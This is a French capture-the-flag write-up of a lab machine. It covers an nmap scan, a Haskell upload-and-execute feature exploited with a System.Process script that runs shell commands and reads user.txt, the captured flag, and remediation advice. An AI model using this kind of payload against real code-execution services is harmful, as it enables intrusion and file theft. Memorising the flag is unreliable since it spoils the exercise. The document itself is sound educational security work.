# Fun With Functional — Write-up

> État : accès **user** obtenu (exécution de code en tant que `www-data`). La partie *privilege escalation* (root) sera ajoutée ultérieurement.

## 1. Reconnaissance

Scan des services exposés sur la cible :

```bash
nmap -sC -sV -o notes.txt 10.10.0.25
```

Résultat :

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
5001/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.13.5)
|_http-title: FUN with functionnal !
|_http-server-header: Werkzeug/3.1.8 Python/3.13.5
```

Paramètres utilisés :

* `-sC` : lance les scripts NSE par défaut.
* `-sV` : détecte les services et leurs versions.
* `-o notes.txt` : enregistre la sortie dans un fichier.

Deux services sont exposés : **SSH (22)** et un **serveur web Python/Werkzeug (5001)**. Le titre « FUN with functionnal ! » oriente vers une application web liée à la programmation fonctionnelle.

## 2. Énumération Web

Accès à l'application web :

```bash
http://10.10.0.25:5001
```

L'application propose une fonctionnalité d'**upload de script Haskell**, qui est ensuite **compilé et exécuté côté serveur**. C'est le vecteur d'attaque : si le serveur exécute un code arbitraire que je fournis, je peux obtenir une exécution de commandes système.

## 3. Exploitation — Exécution de code via script Haskell

Haskell permet d'exécuter des commandes système via le module `System.Process`. Un script a été créé pour lancer des commandes shell et récupérer le résultat :

```haskell
import System.Process

main = do
    out <- readProcess "sh" ["-c", "id; pwd; find / -name user.txt 2>/dev/null; cat ~/user.txt 2>/dev/null; cat /home/*/user.txt 2>/dev/null"] ""
    putStrLn out
```

Explication du script :

* `readProcess "sh" ["-c", "..."]` : exécute une commande shell sur le serveur.
* `id` : vérifie sous quelle identité tourne le code.
* `pwd` : affiche le répertoire de travail.
* `find / -name user.txt` : recherche le fichier de flag sur tout le système.
* `cat ~/user.txt` et `cat /home/*/user.txt` : tente de lire le flag dans les répertoires personnels.

Le script (`ilovehaskell.hs`) a été envoyé via le **formulaire d'upload de l'application web**, directement dans le navigateur à l'adresse `http://10.10.0.25:5001`. Après envoi, le serveur le compile et l'exécute automatiquement, puis affiche la sortie dans la page.

## 4. Résultat de l'exécution

Le serveur compile puis exécute le script, et renvoie la sortie :

```text
[1 of 2] Compiling Main             ( /var/www/html/uploads/ilovehaskell.hs, /var/www/html/uploads/ilovehaskell.o )
[2 of 2] Linking /var/www/html/uploads/ilovehaskell
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/
/home/prof/user.txt
```

L'exécution confirme un accès en tant que **`www-data`** (le compte du serveur web), avec pour répertoire de travail `/`. Le fichier de flag se trouve dans `/home/prof/user.txt`.

## 5. Récupération du user flag

La commande `cat /home/*/user.txt` incluse dans le script a directement retourné le contenu du flag :

```text
EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}
```

## Méthodologie

```text
Reconnaissance (nmap)
        ↓
Découverte du service web (port 5001, Werkzeug/Python)
        ↓
Énumération web → fonctionnalité d'upload de script Haskell
        ↓
Script Haskell malveillant (System.Process → exécution de commandes)
        ↓
Upload + compilation/exécution côté serveur
        ↓
Exécution de code en tant que www-data
        ↓
Lecture de /home/prof/user.txt → user flag
```

## Vulnérabilités identifiées

**1. Exécution de code arbitraire via upload de script (Unrestricted Upload → RCE)**
* *Composant affecté :* fonctionnalité d'upload de l'application web (port 5001), qui compile et exécute le code fourni par l'utilisateur.
* *Impact :* un attaquant peut faire exécuter n'importe quelle commande système par le serveur (ici via `System.Process` en Haskell).
* *Risque :* c'est une des failles les plus graves (**Remote Code Execution**). Elle donne un pied dans le système et sert de base à une élévation de privilèges. L'attaquant peut lire des fichiers, ouvrir un reverse shell, etc.
* *Remédiation :* ne jamais exécuter du code fourni par l'utilisateur ; si un bac à sable de code est nécessaire, l'isoler dans un environnement confiné (conteneur restreint, seccomp, utilisateur sans privilèges, pas d'accès réseau/FS). Valider et restreindre strictement ce qui est uploadé.

**2. Exposition d'un serveur de développement en production**
* *Composant affecté :* serveur **Werkzeug** (serveur de dev de Flask) exposé sur le port 5001.
* *Impact :* Werkzeug n'est pas prévu pour la production et peut exposer des fonctions de debug dangereuses.
* *Risque :* surface d'attaque accrue, messages d'erreur verbeux, voire console de debug interactive.
* *Remédiation :* utiliser un serveur WSGI de production (gunicorn, uWSGI) derrière un reverse proxy ; désactiver le mode debug.

## Notes pour la soutenance

* Point théorique lié au flag : le nom du flag suggère qu'un script Haskell peut aussi servir de **reverse shell** — c'est cohérent avec la vulnérabilité RCE (on aurait pu remplacer la commande de lecture par un payload de reverse shell depuis revshells.com).
* Question probable : *pourquoi exécuter du code utilisateur est-il dangereux ?* → voir vulnérabilité 1.
* `www-data` est un compte à faibles privilèges : c'est le point de départ typique avant la phase de *privilege escalation* (à documenter ensuite).
